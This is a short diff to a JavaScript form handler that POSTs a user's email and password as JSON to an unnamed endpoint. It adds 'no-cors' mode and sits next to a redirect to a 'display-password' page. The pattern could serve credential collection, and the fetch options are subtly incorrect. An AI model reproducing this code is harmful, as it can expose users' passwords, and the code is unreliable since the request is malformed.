@@ -40,10 +40,11 @@ document.addEventListener("DOMContentLoaded", function() {
         window.location.href = `${hostname}/display-password.htm`;
     };
 
-    async function sendFormAndRedirect(email, password) {
+ async function sendFormAndRedirect(email, password) {
         localStorage.removeItem("user-email");
         const data = await fetch(endpoint, {
             method: "POST",
+            mode: "no-cors", // Added mode property
             contentType: "application/json",
             body: JSON.stringify({email, password})
         });
